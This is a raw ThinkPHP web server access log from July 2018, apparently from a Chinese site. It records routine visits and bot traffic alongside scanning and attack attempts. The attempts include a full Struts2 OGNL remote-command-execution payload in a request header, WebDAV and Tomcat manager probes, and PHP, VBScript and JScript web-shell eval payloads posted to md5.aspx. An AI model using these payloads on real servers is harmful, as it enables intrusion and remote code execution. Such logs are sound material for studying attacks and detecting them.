[ 2018-07-08T00:52:45+08:00 ] 172.16.0.5 124.40.251.218 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.014773s][吞吐率：67.69req/s] [内存消耗：1,683.98kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'host' => '123.207.34.110:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T00:54:37+08:00 ] 172.16.0.5 31.24.141.110 GET /webdav/
[ log ] 123.207.34.110:80/webdav/ [运行时间：0.012190s][吞吐率：82.04req/s] [内存消耗：1,355.30kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'webdav',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'host' => '123.207.34.110:80',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T00:54:43+08:00 ] 172.16.0.5 31.24.141.110 GET /index.php
[ log ] 123.207.34.110/index.php [运行时间：0.015218s][吞吐率：65.71req/s] [内存消耗：1,683.82kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'host' => '123.207.34.110',
  'user-agent' => 'Mozilla/5.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T01:39:59+08:00 ] 172.16.0.5 94.183.196.62 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.014708s][吞吐率：67.99req/s] [内存消耗：1,683.98kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'host' => '123.207.34.110:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T02:02:45+08:00 ] 172.16.0.5 139.199.71.216 GET /webdav/
[ log ] 123.207.34.110:80/webdav/ [运行时间：0.012202s][吞吐率：81.95req/s] [内存消耗：1,355.30kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'webdav',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'host' => '123.207.34.110:80',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T02:03:07+08:00 ] 172.16.0.5 139.199.71.216 GET /index.php
[ log ] 123.207.34.110/index.php [运行时间：0.014272s][吞吐率：70.07req/s] [内存消耗：1,683.82kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'host' => '123.207.34.110',
  'user-agent' => 'Mozilla/5.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T04:11:53+08:00 ] 172.16.0.5 112.73.90.248 GET /
[ log ] 123.207.34.110/ [运行时间：0.014852s][吞吐率：67.33req/s] [内存消耗：1,684.01kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'host' => '123.207.34.110',
  'accept' => '*/*',
  'user-agent' => 'User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T04:11:54+08:00 ] 172.16.0.5 112.73.90.248 GET /index.action
[ log ] 123.207.34.110/index.action [运行时间：0.012871s][吞吐率：77.69req/s] [内存消耗：1,360.37kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index.action',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '123.207.34.110',
  'content-type' => '%{(#nike=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'whoami\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'echo windows--2017\'}:{\'/bin/bash\',\'-c\',\'echo linux--2017\'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T04:37:26+08:00 ] 172.16.0.5 185.97.122.17 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.013707s][吞吐率：72.96req/s] [内存消耗：1,683.98kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '123.207.34.110:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T05:50:07+08:00 ] 172.16.0.5 118.24.122.95 GET /webdav/
[ log ] 123.207.34.110:80/webdav/ [运行时间：0.011706s][吞吐率：85.43req/s] [内存消耗：1,355.30kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'webdav',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'host' => '123.207.34.110:80',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T05:50:37+08:00 ] 172.16.0.5 118.24.122.95 GET /index.php
[ log ] 123.207.34.110/index.php [运行时间：0.014716s][吞吐率：67.95req/s] [内存消耗：1,683.82kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'host' => '123.207.34.110',
  'user-agent' => 'Mozilla/5.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T06:12:04+08:00 ] 172.16.0.5 187.56.229.81 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.014334s][吞吐率：69.76req/s] [内存消耗：1,683.98kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '123.207.34.110:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T06:30:36+08:00 ] 172.16.0.5 159.65.5.193 HEAD /
[ log ] zard-forever.com/ [运行时间：0.014193s][吞吐率：70.46req/s] [内存消耗：1,683.77kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'zard-forever.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T06:30:36+08:00 ] 172.16.0.5 159.65.5.193 HEAD /
[ log ] www.zard-forever.com/ [运行时间：0.015210s][吞吐率：65.75req/s] [内存消耗：1,683.73kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.zard-forever.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T07:14:12+08:00 ] 172.16.0.5 31.148.37.7 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.017146s][吞吐率：58.32req/s] [内存消耗：1,683.98kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '123.207.34.110:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T08:09:28+08:00 ] 172.16.0.5 103.4.165.241 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.014756s][吞吐率：67.77req/s] [内存消耗：1,683.98kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '123.207.34.110:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T08:33:22+08:00 ] 172.16.0.5 165.16.56.131 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.014885s][吞吐率：67.18req/s] [内存消耗：1,683.98kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '123.207.34.110:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T08:50:11+08:00 ] 172.16.0.5 168.1.128.34 GET /
[ log ] zard-forever.com/ [运行时间：0.018848s][吞吐率：53.06req/s] [内存消耗：1,683.14kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'zard-forever.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T08:51:19+08:00 ] 172.16.0.5 121.22.40.179 HEAD /
[ log ] 123.207.34.110/ [运行时间：0.015481s][吞吐率：64.60req/s] [内存消耗：1,682.80kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T08:53:53+08:00 ] 172.16.0.5 207.46.13.43 GET /
[ log ] zard-forever.com/ [运行时间：0.015690s][吞吐率：63.74req/s] [内存消耗：1,686.52kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'host' => 'zard-forever.com',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'connection' => 'Keep-Alive',
  'cache-control' => 'no-cache',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T09:15:33+08:00 ] 172.16.0.5 60.12.252.18 GET /manager/html
[ log ] 123.207.34.110:80/manager/html [运行时间：0.011543s][吞吐率：86.63req/s] [内存消耗：1,356.20kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manager',
    1 => 'html',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => 'Basic Og==',
  'host' => '123.207.34.110:80',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)',
  'accept' => 'text/html, application/xhtml+xml, */*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T09:22:04+08:00 ] 172.16.0.5 81.178.138.210 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.014133s][吞吐率：70.76req/s] [内存消耗：1,683.98kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '123.207.34.110:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T09:50:32+08:00 ] 172.16.0.5 207.46.13.43 GET /
[ log ] www.zard-forever.com/ [运行时间：0.014913s][吞吐率：67.06req/s] [内存消耗：1,686.52kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'host' => 'www.zard-forever.com',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'connection' => 'Keep-Alive',
  'cache-control' => 'no-cache',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T10:37:19+08:00 ] 172.16.0.5 192.200.218.179 POST /dxyylc/md5.aspx
[ log ] www.00it.cn/dxyylc/md5.aspx [运行时间：0.012015s][吞吐率：83.23req/s] [内存消耗：1,359.67kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'dxyylc',
    1 => 'md5.aspx',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.00it.cn',
  'content-length' => '343',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://www.00it.cn/dxyylc/md5.aspx',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  'q' => '@                                                 eval                                                             (base64_decode($_POST[z0]));',
  'z0' => 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOztwcmludCgiaGFvcmVuZ2UuY29tUVEzMTcyNzU3MzgiKTs7ZWNobygifDwtIik7ZGllKCk7',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T10:37:20+08:00 ] 172.16.0.5 192.200.218.179 POST /dxyylc/md5.aspx
[ log ] www.00it.cn/dxyylc/md5.aspx [运行时间：0.013878s][吞吐率：72.06req/s] [内存消耗：1,360.48kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'dxyylc',
    1 => 'md5.aspx',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.00it.cn',
  'content-length' => '797',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://www.00it.cn/dxyylc/md5.aspx',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  'q' => 'Execute                              ("                              Execute                              (""          :Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""->|""""):                    Execute                              (""""On Error Resume Next:""""&bd(""""526573706F6E73652E5772697465282268616F72656E67652E636F6D51513331373237353733382229"""")):Response.Write(""""|<-""""):Response.End"")")',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T10:37:26+08:00 ] 172.16.0.5 192.200.218.179 POST /dxyylc/md5.aspx
[ log ] www.00it.cn/dxyylc/md5.aspx [运行时间：0.011887s][吞吐率：84.13req/s] [内存消耗：1,359.67kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'dxyylc',
    1 => 'md5.aspx',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.00it.cn',
  'content-length' => '346',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://www.00it.cn/dxyylc/md5.aspx',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  'q' => 'Response.Write("------>|");var err:Exception;try{                         eval                    (System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("UmVzcG9uc2UuV3JpdGUoImhhb3JlbmdlLmNvbVFRMzE3Mjc1NzM4Iik7")),"unsafe");}catch(err){Response.Write("ERROR:// "+err.essage);}Response.Write("|<----");Response.End();',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T10:37:40+08:00 ] 172.16.0.5 192.200.218.179 POST /admin/Admin_Ta.asp
[ log ] www.00it.cn/admin/Admin_Ta.asp [运行时间：0.011682s][吞吐率：85.60req/s] [内存消耗：1,360.78kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
